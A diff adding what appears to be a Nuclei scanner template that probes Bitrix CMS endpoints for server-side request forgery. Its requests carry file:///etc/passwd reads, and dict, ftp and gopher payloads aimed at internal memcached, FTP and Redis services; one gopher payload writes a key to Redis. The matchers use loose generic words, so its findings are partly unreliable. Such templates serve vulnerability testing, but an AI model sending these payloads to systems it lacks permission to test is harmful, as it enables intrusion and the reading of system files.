@@ -1,0 +1,294 @@
+id: bitrix-ssrf-advanced
+
+info:
+  name: Bitrix Advanced SSRF (Server-Side Request Forgery) Vulnerabilities
+  author: clevergod
+  severity: high
+  description: |
+    Расширенная проверка SSRF уязвимостей в Bitrix CMS через различные эндпоинты и протоколы
+  tags: bitrix,ssrf,server-side-request-forgery,network
+
+requests:
+  # SSRF через imagepg.php с различными протоколами
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrix/tools/imagepg.php?img=file:///etc/passwd"
+      - "{{BaseURL}}/bitrix/tools/imagepg.php?img=dict://127.0.0.1:11211/stat"
+      - "{{BaseURL}}/bitrix/tools/imagepg.php?img=ftp://127.0.0.1:21"
+      - "{{BaseURL}}/bitrix/tools/imagepg.php?img=gopher://127.0.0.1:6379/_SET%20test%20test"
+    matchers:
+      - type: word
+        name: ssrf-imagepg-protocols
+        words:
+          - "root:"
+          - "STAT"
+          - "220"
+          - "OK"
+
+  # SSRF через html_editor_action с различными протоколами
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=get_url_preview&url=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-html-editor-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=get_url_preview&url=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-html-editor-dict
+        words:
+          - "STAT"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=get_url_preview&url=ftp://127.0.0.1:21
+    matchers:
+      - type: word
+        name: ssrf-html-editor-ftp
+        words:
+          - "220"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=get_url_preview&url=gopher://127.0.0.1:6379/_SET%20test%20test
+    matchers:
+      - type: word
+        name: ssrf-html-editor-gopher
+        words:
+          - "OK"
+
+  # SSRF через site_checker с различными протоколами
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/site_checker.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=check&site=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-site-checker-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/site_checker.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=check&site=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-site-checker-dict
+        words:
+          - "STAT"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/site_checker.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=check&site=ftp://127.0.0.1:21
+    matchers:
+      - type: word
+        name: ssrf-site-checker-ftp
+        words:
+          - "220"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/site_checker.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=check&site=gopher://127.0.0.1:6379/_SET%20test%20test
+    matchers:
+      - type: word
+        name: ssrf-site-checker-gopher
+        words:
+          - "OK"
+
+  # SSRF через компонент vote
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      VOTE_ID=1&URL=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-vote-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      VOTE_ID=1&URL=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-vote-dict
+        words:
+          - "STAT"
+
+  # SSRF через компонент forum
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      FID=1&URL=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-forum-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      FID=1&URL=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-forum-dict
+        words:
+          - "STAT"
+
+  # SSRF через компонент blog
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      BLOG_ID=1&URL=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-blog-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      BLOG_ID=1&URL=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-blog-dict
+        words:
+          - "STAT"
+
+  # SSRF через компонент catalog
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      IBLOCK_ID=1&URL=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-catalog-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      IBLOCK_ID=1&URL=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-catalog-dict
+        words:
+          - "STAT"
+
+  # SSRF через компонент sale
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/sale.basket.basket/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      PRODUCT_ID=1&URL=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-sale-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/sale.basket.basket/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      PRODUCT_ID=1&URL=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-sale-dict
+        words:
+          - "STAT"
+
+  # SSRF через WebDAV
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/webdav.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=check&url=file:///etc/passwd
+    matchers:
+      - type: word
+        name: ssrf-webdav-file
+        words:
+          - "root:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/webdav.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=check&url=dict://127.0.0.1:11211/stat
+    matchers:
+      - type: word
+        name: ssrf-webdav-dict
+        words:
+          - "STAT" 
